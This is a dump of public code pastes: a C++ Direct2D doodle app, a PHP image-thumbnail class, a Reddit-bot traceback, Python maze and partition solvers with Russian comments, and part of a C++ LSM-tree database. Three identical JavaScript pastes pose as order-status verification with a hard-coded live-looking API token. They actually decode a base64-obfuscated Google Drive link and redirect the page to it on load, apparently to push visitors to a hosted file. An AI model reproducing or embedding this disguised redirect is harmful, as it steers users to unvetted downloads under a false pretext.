        D2D1_RECT_F worldRect = D2D1::RectF((FLOAT)scrollX, (FLOAT)scrollY,
            (FLOAT)(scrollX + rcClient.right), (FLOAT)(scrollY + rcClient.bottom));
        if (showGrid) {
            DrawGrid(pRenderTarget, worldRect);
        }

        // Reset transform to identity for UI.
        pRenderTarget->SetTransform(D2D1::Matrix3x2F::Identity());

        // Draw status bar in screen coordinates.
        D2D1_RECT_F statusRect = D2D1::RectF(0, (FLOAT)rcClient.bottom - 30.0f, (FLOAT)rcClient.right, (FLOAT)rcClient.bottom);
        ID2D1SolidColorBrush* pStatusBgBrush = nullptr;
        pRenderTarget->CreateSolidColorBrush(D2D1::ColorF(0.2f, 0.2f, 0.2f), &pStatusBgBrush);
        pRenderTarget->FillRectangle(statusRect, pStatusBgBrush);
        pStatusBgBrush->Release();
        ID2D1SolidColorBrush* pTextBrush = nullptr;
        pRenderTarget->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pTextBrush);
        pRenderTarget->DrawTextW(
            g_statusText.c_str(),
            static_cast<UINT32>(g_statusText.length()),
            pTextFormat,
            &statusRect,
            pTextBrush,
            D2D1_DRAW_TEXT_OPTIONS_NONE,
            DWRITE_MEASURING_MODE_NATURAL
        );
        pTextBrush->Release();

        HRESULT hr = pRenderTarget->EndDraw();
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_SETCURSOR:
    {
        if (LOWORD(lParam) == HTCLIENT) {
            if (isSpacePressed) {
                SetCursor(LoadCursor(NULL, IDC_SIZEALL));
                return TRUE;
            }
            else if (isPaintbrushSelected || isEraserMode) {
                SetCursor(LoadCursor(NULL, IDC_CROSS));
                return TRUE;
            }
        }
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    case WM_DESTROY:
    {
        if (sessionDirty)
        {
            SaveCanvasState();
            sessionDirty = false;
        }
        DiscardDeviceResources();
        if (pFactory)
        {
            pFactory->Release();
            pFactory = nullptr;
        }
        if (pTextFormat)
        {
            pTextFormat->Release();
            pTextFormat = nullptr;
        }
        if (pDWriteFactory)
        {
            pDWriteFactory->Release();
            pDWriteFactory = nullptr;
        }
        PostQuitMessage(0);
        return 0;
    }
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

//----------------------------------------------------------------
// WinMain
//----------------------------------------------------------------

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    INITCOMMONCONTROLSEX icex = { sizeof(INITCOMMONCONTROLSEX), ICC_BAR_CLASSES };
    InitCommonControlsEx(&icex);
    const wchar_t CLASS_NAME[] = L""InfiniteCanvasClass"";
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
    RegisterClass(&wc);
    hInst = hInstance;
    hWnd = CreateWindowEx(0, CLASS_NAME,
        L""Infinite Canvas Doodle App (Direct2D Accelerated, P=Brush, E=Eraser, C=Clear, +/-=BrushSize, Space+Drag/Arrow=Panning, Home=Reset, Q=Color, G=Grid, A=Alpha, PgUp=ZoomIn, PgDn=ZoomOut, F1=About)"",
        WS_OVERLAPPEDWINDOW | WS_MAXIMIZE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL, NULL, hInstance, NULL);
    if (hWnd == NULL)
        return 0;
    // Enable double buffering via WS_EX_COMPOSITED.
    SetWindowLongPtr(hWnd, GWL_EXSTYLE, GetWindowLongPtr(hWnd, GWL_EXSTYLE) | WS_EX_COMPOSITED);
    ShowWindow(hWnd, SW_SHOWMAXIMIZED);
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
```"
j192nJEd,Thumb,Jopehn,PHP,Thursday 27th of March 2025 10:18:14 AM CDT,"<?php
/**
 * Thumb de imágenes
 */
class thumb
{
	private $image;
	private $type;
	private $width;
	private $height;
	private $name;
	//---Método de leer la imagen
	public function loadImage($name)
	{
		//---Tomar las dimensiones de la imagen
		$info=getimagesize($name);
		$this->width=$info[0];
		$this->height=$info[1];
		$this->type=$info[2];
		// $this->name=$name;
		//---dependiendo del tipo de imagen crear una nueva imagen
		switch ($this->type) {
			case IMAGETYPE_JPEG:
				$this->image=imagecreatefromjpeg($name);
				break;
			case IMAGETYPE_GIF:
				$this->image=imagecreatefromgif($name);
				break;
			case IMAGETYPE_PNG:
				$this->image=imagecreatefrompng($name);
				break;
			default:
				// code...
				break;
		}
	}
	//---método de guardar la imagen
	public function save($name, $quality=100)
	{
		//---guardar la imagene en el tipo de archivo correcto
		switch ($this->type) {
			case IMAGETYPE_JPEG:
				imagejpeg($this->image, $name, $quality);
				break;
			case IMAGETYPE_GIF:
				imagegif($this->image, $name);
				break;
			case IMAGETYPE_PNG:
				$pngquality=floor(($quality-10)/10);
				imagepng($this->image, $name, $pngquality);
				break;
			default:
				// code...
				break;
		}
		// $this->name=$name;
	}
	//---método de mostrar la imagen sin salvarla
	public function show()
	{
		//---mostrar la imagen dependiendo del tipo de archivo
		switch ($this->type) {
			case IMAGETYPE_JPEG:
				imagejpeg($this->image);
				break;
			case IMAGETYPE_GIF:
				imagegif($this->image);
				break;
			case IMAGETYPE_PNG:
				imagepng($this->image);
				break;
			default:
				// code...
				break;
		}
	}
	public function resize($value, $prop)
	{
		//---determinar la propiedad a redimensionar y la propiedad opuesta
		$prop_value=($prop=='width')? $this->width : $this->height;
		$prop_versus=($prop=='width')? $this->height : $this->width;
		//---determinar el valor opuesto a la propiedad a redimensionar
		$pcent=$value/$prop_value;
		$value_versus=$prop_versus*$pcent;
		//---crear la imagen dependiendo de la propiedad a variar
		// $image=($prop=='width')? imagecreatetruecolor($value, $value_versus) : imagecreatetruecolor($value_versus, $value);
		if ($prop=='width') {
			$image=imagecreatetruecolor($value, $value_versus);
		}else{
			$image=imagecreatetruecolor($value_versus, $value);
		}
		//---hacer una copia de la imagen dependiendo de la propiedad a variar
		switch ($prop) {
			case 'width':
				imagecopyresampled($image, $this->image, 0, 0, 0, 0, $value, $value_versus, $this->width, $this->height);
				break;
			case 'height':
				imagecopyresampled($image, $this->image, 0, 0, 0, 0, $value_versus, $value, $this->width, $this->height);
				break;
			default:
				// code...
				break;
		}
		//---actualizar la imagen y sus dimensiones
		// $info=getimagesize($this->name);
		// $this->width=imagesx($image);
		// $this->height=imagesy($image);
		$this->image=$image;
	}
	//---método de extraer una sección de la imagen sin deformada
	public function crop($cwidth, $cheight, $pos='center')
	{
		//---dependiendo del tamaño deseado redimensionar primero la imagen a uno de los valores
		if ($cwidth>$cheight) {
			$this->resize($cwidth, 'width');
		}else{
			$this->resize($cheight, 'height');
		}
		//---crear la imagen tomando la porción del centro de la imagen redimensionada con las dimensiones deseadas
		$image=imagecreatetruecolor($cwidth, $cheight);
		switch ($pos) {
			case 'center':
				imagecopyresampled($image, $this->image, 0, 0, abs(($this->width-$cwidth)/2), abs(($this->height-$cheight)), $cwidth, $cheight, $cwidth, $cheight);
				break;
			case 'left':
				imagecopyresampled($image, $this->image, 0, 0, 0, abs(($this->height-$cheight)/2), $cwidth, $cheight, $cwidth, $cheight);
				break;
			case 'right':
				imagecopyresampled($image, $this->image, 0, 0, $this->width-$cwidth, abs(($this->height-$cheight)), $cwidth, $cheight, $cwidth, $cheight);
				break;
			case 'top':
				imagecopyresampled($image, $this->image, 0, 0, abs(($this->width-$cwidth)/2), 0, $cwidth, $cheight, $cwidth, $cheight);
				break;
			case 'botton':
				imagecopyresampled($image, $this->image, abs(($this->width-$cwidth)/2), $this->height-$cheight, $cwidth, $cheight, $cwidth, $cheight);
				break;
			default:
				// code...
				break;
		}
		$this->image=$image;
	}
}
/*
Lee la image desde la ruta especificada
loadImage($name:string)
Guarda la imagen en la ruta especificada y con una calidad de 0 a 100 definida por el usuario (máxima calidad por defecto)
save($name:string, $quality:int=100)
Muestra la imagen en la página sin guardarla previamente
show()
Redimensiona la imagen en ancho o alto manteniendo sus proporciones
$prop puede tomar los valores de 'width' o 'height'
resize($value:int, $prop:string)
Crea un thumbnail de la imagen con las medidas especificadas y manteniendo las proporciones visuales de la imagen intactas
$pos puede tomar los valores de 'left', 'top', 'right', 'botton' o 'center'
crop($cwidth:int, $cheight:int, $pos:string)
*/
?>"
P859EEV1,Products.js,Epiphemeral,JavaScript,Thursday 27th of March 2025 10:10:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/920/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NwRMP9XE,RequestException: error with request,basedcount_bot,Python,Thursday 27th of March 2025 09:57:40 AM CDT,"Traceback (most recent call last):
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 261, in read_comments
    main_logger.info(f""Logged into {await reddit_instance.user.me()} Account."")
                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/user.py"", line 171, in me
    user_data = await self._reddit.get(API_PATH[""me""])
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 813, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 570, in _objectify_request
    await self.request(
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1061, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 286, in _request_with_retries
    response, saved_exception = await self._make_request(
                                ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 192, in _make_request
    response = await self._rate_limiter.call(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/rate_limit.py"", line 51, in call
    response = await request_function(*args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/requestor.py"", line 80, in request
    raise RequestException(exc, args, kwargs) from None
asyncprawcore.exceptions.RequestException: error with request 
"
re9uJKa6,Untitled,Hasli4,Python,Thursday 27th of March 2025 09:55:59 AM CDT,"def generate_partitions(n, max_val=None, current_partition=None):
    """"""
    Рекурсивная функция генерации всех разложений числа n на слагаемые.
    
    Args:
        n (int): Оставшаяся сумма для разложения
        max_val (int, optional): Максимальное значение текущего слагаемого
        current_partition (list, optional): Текущее частичное разложение
    
    Returns:
        list: Список всех возможных разложений числа
    """"""
    # Инициализация начальных параметров
    if max_val is None:
        max_val = n
    if current_partition is None:
        current_partition = []
    
    # Базовый случай: если остаток равен 0, возвращаем текущее разложение
    if n == 0:
        return [current_partition]
    
    partitions = []
    
    # Перебираем возможные значения слагаемых от 1 до min(n, max_val)
    for i in range(1, min(n, max_val) + 1):
        # Рекурсивный вызов с уменьшением остатка и добавлением слагаемого
        new_partitions = generate_partitions(
            n - i, 
            i,  # Ограничиваем максимальное значение следующего слагаемого
            current_partition + [i]
        )
        partitions.extend(new_partitions)
    
    return partitions

def write_partitions_to_file(n, filename='partitions.txt'):
    """"""
    Генерация и запись разложений числа в файл.
    
    Args:
        n (int): Число для разложения
        filename (str, optional): Имя файла для вывода
    """"""
    # Получаем все разложения
    partitions = generate_partitions(n)
    
    # Сортируем разложения в обратном лексикографическом порядке
    partitions.sort(reverse=True)
    
    # Преобразуем разложения в строковый формат
    partition_strings = [
        '+'.join(map(str, partition)) 
        for partition in partitions
    ]
    
    # Запись в файл
    with open(filename, 'w') as f:
        for partition in partition_strings:
            f.write(partition + '\n')
    
    print(f""Разложения числа {n} записаны в файл {filename}"")

# Пример использования
n = 4
write_partitions_to_file(n)"
wssUrWZ6,Order.js,Epiphemeral,JavaScript,Thursday 27th of March 2025 09:54:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/432/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BxfviSKH,bucktrack10,Hasli4,Python,Thursday 27th of March 2025 09:46:27 AM CDT,"def read_maze(filename):
    """"""Чтение лабиринта из файла""""""
    with open(filename, 'r') as f:
        return [list(line.strip().split()) for line in f]

def solve_maze(maze, mouse_x, mouse_y, cheese_x, cheese_y):
    """"""Решение лабиринта с подсчетом путей""""""
    N = len(maze)
    visited = [[False for _ in range(N)] for _ in range(N)]

    def is_valid_move(x, y):
        """"""Проверка корректности движения""""""
        return (
            0 <= x < N and 
            0 <= y < N and 
            maze[x][y] == ' ' and 
            not visited[x][y]
        )

    def find_paths(x, y):
        """"""Рекурсивный поиск путей""""""
        # Достижение сыра
        if x == cheese_x and y == cheese_y:
            return 1

        # Отмечаем клетку как посещенную
        visited[x][y] = True
        
        paths = 0
        # Возможные направления: вверх, вправо, вниз, влево
        moves = [(-1, 0), (0, 1), (1, 0), (0, -1)]
        
        for dx, dy in moves:
            next_x, next_y = x + dx, y + dy
            
            if is_valid_move(next_x, next_y):
                paths += find_paths(next_x, next_y)
        
        # Возвращаем клетку в непосещенное состояние
        visited[x][y] = False
        
        return paths

    return find_paths(mouse_x, mouse_y)

def main():
    # Чтение лабиринта
    maze = read_maze('maze.txt')
    
    # Координаты мышки и сыра
    mouse_x, mouse_y = 1, 1  # Начальная позиция мышки
    cheese_x, cheese_y = 3, 3  # Позиция сыра
    
    # Подсчет путей
    paths = solve_maze(maze, mouse_x, mouse_y, cheese_x, cheese_y)
    print(f""Количество путей: {paths}"")

if __name__ == ""__main__"":
    main()"
PNYw9kWk,bucktrakc10,Hasli4,Python,Thursday 27th of March 2025 09:43:18 AM CDT,"def read_maze(filename):
    """"""Чтение лабиринта из файла""""""
    with open(filename, 'r') as f:
        return [line.strip().split() for line in f]

def count_paths(maze, mouse_x, mouse_y, cheese_x, cheese_y):
    """"""
    Рекурсивный поиск путей к сыру
    
    Параметры:
    - maze: лабиринт
    - mouse_x, mouse_y: текущие координаты мышки
    - cheese_x, cheese_y: координаты сыра
    """"""
    N = len(maze)
    
    # Создаем матрицу посещенных клеток
    visited = [[False for _ in range(N)] for _ in range(N)]
    
    def is_valid_move(x, y):
        """"""Проверка корректности хода""""""
        return (
            0 <= x < N and 
            0 <= y < N and 
            maze[x][y] == ' ' and  # Проверка на пустую клетку
            not visited[x][y]      # Клетка не посещена
        )
    
    def find_paths_recursive(current_x, current_y):
        """"""
        Рекурсивный поиск путей
        
        Базовые случаи:
        1. Мышка достигла сыра
        2. Невозможность движения
        """"""
        # Достижение цели
        if current_x == cheese_x and current_y == cheese_y:
            return 1
        
        # Отмечаем текущую клетку как посещенную
        visited[current_x][current_y] = True
        
        # Возможные направления движения (вверх, вправо, вниз, влево)
        directions = [
            (-1, 0),  # Вверх
            (0, 1),   # Вправо
            (1, 0),   # Вниз
            (0, -1)   # Влево
        ]
        
        total_paths = 0
        
        # Исследование каждого направления
        for dx, dy in directions:
            next_x, next_y = current_x + dx, current_y + dy
            
            # Проверка возможности перемещения
            if is_valid_move(next_x, next_y):
                # Рекурсивный вызов для следующей позиции
                total_paths += find_paths_recursive(next_x, next_y)
        
        # Возвращаем клетку в непосещенное состояние (backtracking)
        visited[current_x][current_y] = False
        
        return total_paths
    
    # Начинаем поиск путей с начальной позиции мышки
    return find_paths_recursive(mouse_x, mouse_y)

def main():
    # Чтение лабиринта
    maze = read_maze('maze.txt')
    
    # Координаты мышки и сыра (указать правильные)
    mouse_x, mouse_y = 1, 1  # Начальная позиция мышки
    cheese_x, cheese_y = 3, 3  # Позиция сыра
    
    # Подсчет путей
    paths = count_paths(maze, mouse_x, mouse_y, cheese_x, cheese_y)
    print(f""Количество путей: {paths}"")

if __name__ == ""__main__"":
    main()"
6naiZW8R,backtrack10,Hasli4,Python,Thursday 27th of March 2025 09:38:23 AM CDT,"import os

def find_cheese_paths(maze, start_x, start_y, cheese_x, cheese_y):
    """"""
    Рекурсивная функция для подсчета путей мышки к сыру в лабиринте
    
    Параметры:
    maze - двумерный список лабиринта
    start_x, start_y - начальные координаты мышки
    cheese_x, cheese_y - координаты сыра
    
    Возвращает:
    Количество различных путей до сыра
    """"""
    # Размер лабиринта
    N = len(maze)
    
    # Создаем копию лабиринта для отслеживания посещенных клеток
    visited = [[False for _ in range(N)] for _ in range(N)]
    
    def is_valid_move(x, y):
        """"""
        Проверка корректности движения
        - Координаты в пределах лабиринта
        - Нет стены
        - Клетка не посещена
        """"""
        return (
            0 <= x < N and 
            0 <= y < N and 
            maze[x][y] != 'M' and 
            not visited[x][y]
        )
    
    def dfs(current_x, current_y):
        """"""
        Рекурсивный обход в глубину для подсчета путей
        
        Базовые случаи:
        1. Мышка достигла сыра
        2. Невозможность движения
        """"""
        # Достижение сыра
        if current_x == cheese_x and current_y == cheese_y:
            return 1
        
        # Отмечаем текущую клетку как посещенную
        visited[current_x][current_y] = True
        
        # Возможные направления движения (вверх, вправо, вниз, влево)
        directions = [
            (-1, 0),  # Вверх
            (0, 1),   # Вправо
            (1, 0),   # Вниз
            (0, -1)   # Влево
        ]
        
        total_paths = 0
        
        #探索每个方向
        for dx, dy in directions:
            next_x, next_y = current_x + dx, current_y + dy
            
            # Проверка возможности перемещения
            if is_valid_move(next_x, next_y):
                # Рекурсивный вызов для следующей позиции
                total_paths += dfs(next_x, next_y)
        
        # Возвращаем клетку в непосещенное состояние (backtracking)
        visited[current_x][current_y] = False
        
        return total_paths
    
    # Начинаем поиск путей с начальной позиции мышки
    return dfs(start_x, start_y)

def read_maze_from_file(filename):
    """"""
    Чтение лабиринта из текстового файла
    """"""
    with open(filename, 'r') as f:
        return [list(line.strip()) for line in f]

def main():
    # Путь к файлу с лабиринтом
    maze_file = 'maze.txt'
    
    # Чтение лабиринта
    maze = read_maze_from_file(maze_file)
    
    # Параметры: начальная позиция мышки и позиция сыра
    start_x, start_y = 0, 0     # Пример начальной позиции
    cheese_x, cheese_y = 4, 4   # Пример позиции сыра
    
    # Подсчет путей
    paths_count = find_cheese_paths(maze, start_x, start_y, cheese_x, cheese_y)
    
    print(f""Количество различных путей: {paths_count}"")

if __name__ == ""__main__"":
    main()"
6Q7vVTgi,Untitled,Epiphemeral,JavaScript,Thursday 27th of March 2025 09:24:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/910/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cHBQGH6c,Redka Compact Init ver 5.0,scottish_esquire,C++,Thursday 27th of March 2025 09:17:12 AM CDT,"#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include <filesystem>
#include <chrono>
#include <thread>
#include <algorithm>
#include <cmath>
#include <sstream>
#include <regex>

namespace fs = std::filesystem;

// Конфигурация
const size_t WAL_SIZE_THRESHOLD = 1024; // 1KB
const std::string WAL_FILENAME = ""wal.log"";
const size_t LEVEL_BASE_SIZE = 10;
const std::string DB_DIR = ""lsm_db"";

#pragma pack(push, 1)
struct SSTHeader {
    uint32_t version = 2; // Версия 2 для поддержки версионирования полей
    uint32_t entry_count;
    uint64_t index_offset;
};

struct SSTIndexEntry {
    uint32_t key_length;
    uint64_t data_offset;
    uint32_t data_length;
};
#pragma pack(pop)

struct FieldValue {
    uint32_t version;
    std::string value;
};

struct WalEntry {
    std::string key;
    std::map<std::string, FieldValue> fields;
};

struct SSTEntry {
    std::string key;
    std::map<std::string, FieldValue> fields;

    bool operator<(const SSTEntry& other) const {
        return key < other.key;
    }
};

class LSMTree {
private:
    std::vector<std::vector<std::string>> levels;

    void ensureDbDir() {
        if (!fs::exists(DB_DIR)) {
            fs::create_directory(DB_DIR);
            for (int i = 0; i < 10; ++i) {
                fs::create_directory(DB_DIR + ""/L"" + std::to_string(i));
            }
        }
    }

    void loadLevels() {
        levels.clear();
        for (int i = 0; ; ++i) {
            std::string level_dir = DB_DIR + ""/L"" + std::to_string(i);
            if (!fs::exists(level_dir)) break;

            std::vector<std::string> files;
            for (const auto& entry : fs::directory_iterator(level_dir)) {
                if (entry.path().extension() == "".sst"") {
                    files.push_back(entry.path().string());
                }
            }
            std::sort(files.begin(), files.end());
            std::reverse(files.begin(), files.end());
            levels.push_back(files);
        }
    }

    void mergeEntries(SSTEntry& target, const SSTEntry& source) {
        for (const auto& [field, src_val] : source.fields) {
            auto it = target.fields.find(field);
            if (it == target.fields.end() || src_val.version > it->second.version) {
                target.fields[field] = src_val;
            }
        }
    }

    void compactLevel(int level) {
        if (level >= levels.size()) return;
        
        std::map<std::string, SSTEntry> merged_entries;
        
        // Собираем и мержим все записи с текущего уровня
        for (const auto& sst_path : levels[level]) {
            auto entries = readSST(sst_path);
            for (const auto& entry : entries) {
                if (merged_entries.find(entry.key) == merged_entries.end()) {
                    merged_entries[entry.key] = entry;
                } else {
                    mergeEntries(merged_entries[entry.key], entry);
                }
            }
        }
    
        if (merged_entries.size() >= LEVEL_BASE_SIZE * std::pow(10, level)) {
            // Преобразуем map в vector для записи
            std::vector<SSTEntry> entries_to_write;
            for (auto& [key, entry] : merged_entries) {
                entries_to_write.push_back(std::move(entry));
            }
            std::sort(entries_to_write.begin(), entries_to_write.end());
    
            // Записываем на следующий уровень
            std::string new_sst = DB_DIR + ""/L"" + std::to_string(level + 1) + ""/"" +
                                 std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) + "".sst"";
            writeSST(new_sst, entries_to_write);
    
            // Удаляем старые файлы
            for (const auto& sst_path : levels[level]) {
                fs::remove(sst_path);
            }
    
            // Обновляем индексы и рекурсивно уплотняем
            loadLevels();
            compactLevel(level + 1);
        }
    }

    std::vector<SSTEntry> readSST(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file) return {};

        SSTHeader header;
        file.read(reinterpret_cast<char*>(&header), sizeof(header));

        std::vector<SSTIndexEntry> index(header.entry_count);
        file.seekg(header.index_offset);
        file.read(reinterpret_cast<char*>(index.data()), header.entry_count * sizeof(SSTIndexEntry));

        std::vector<SSTEntry> entries;
        for (const auto& idx : index) {
            file.seekg(idx.data_offset);
            
            uint32_t total_len;
            file.read(reinterpret_cast<char*>(&total_len), sizeof(total_len));

            std::string key(idx.key_length, '\0');
            file.read(&key[0], idx.key_length);

            std::string fields_data(total_len - idx.key_length, '\0');
            file.read(&fields_data[0], fields_data.size());

            SSTEntry entry;
            entry.key = key;
            entry.fields = parseFields(fields_data);
            entries.push_back(entry);
        }

        return entries;
    }

    std::map<std::string, FieldValue> parseFields(const std::string& data) {
        std::map<std::string, FieldValue> fields;
        std::regex field_re(R""((\w+)(@(\d+))?:([^ ]+))"");
        std::smatch match;
        std::string::const_iterator search_start(data.cbegin());

        while (std::regex_search(search_start, data.cend(), match, field_re)) {
            std::string field = match[1].str();
            uint32_t version = match[3].matched ? std::stoul(match[3].str()) : 1;
            std::string value = match[4].str();

            fields[field] = {version, value};
            search_start = match[0].second;
        }

        return fields;
    }

    std::string serializeFields(const std::map<std::string, FieldValue>& fields) {
        std::stringstream ss;
        ss << ""{"";
        bool first = true;
        for (const auto& [field, fv] : fields) {
            if (!first) ss << "" "";
            first = false;
            if (fv.version > 1) {
                ss << field << ""@"" << fv.version << "":"" << fv.value;
            } else {
                ss << field << "":"" << fv.value;
            }
        }
        ss << ""}"";
        return ss.str();
    }

    void writeSST(const std::string& path, const std::vector<SSTEntry>& entries) {
        std::ofstream file(path, std::ios::binary);
        SSTHeader header;
        header.entry_count = entries.size();
        file.write(reinterpret_cast<char*>(&header), sizeof(header));

        std::vector<SSTIndexEntry> index;
        for (const auto& entry : entries) {
            SSTIndexEntry idx;
            idx.key_length = entry.key.size();
            idx.data_offset = file.tellp();

            std::string fields_data = serializeFields(entry.fields);
            uint32_t total_len = entry.key.size() + fields_data.size();
            
            file.write(reinterpret_cast<char*>(&total_len), sizeof(total_len));
            file.write(entry.key.data(), entry.key.size());
            file.write(fields_data.data(), fields_data.size());

            idx.data_length = total_len;
            index.push_back(idx);
        }

        header.index_offset = file.tellp();
        for (const auto& idx : index) {
            file.write(reinterpret_cast<const char*>(&idx), sizeof(idx));
        }

        file.seekp(0);
        file.write(reinterpret_cast<char*>(&header), sizeof(header));
    }

    std::vector<WalEntry> readWalFile(const std::string& filename) {
        std::vector<WalEntry> entries;
        std::ifstream wal(filename);
        if (!wal) return entries;
    
        std::string line;
        while (std::getline(wal, line)) {
            if (line.empty()) continue;
    
            size_t key_start = line.find('{');
            size_t key_end = line.find(' ', key_start);
            size_t data_start = line.find('{', key_end);
            size_t data_end = line.rfind('}');
    
            if (key_start == std::string::npos || key_end == std::string::npos || 
                data_start == std::string::npos || data_end == std::string::npos) {
                std::cerr << ""Invalid WAL entry: "" << line << std::endl;
                continue;
            }
    
            std::string key = line.substr(key_start + 2, key_end - (key_start + 2));
            std::string fields_data = line.substr(data_start, data_end - data_start + 1);
    
            WalEntry entry;
            entry.key = key;
            entry.fields = parseFields(fields_data);
            entries.push_back(entry);
        }
    
        return entries;
    }

public:
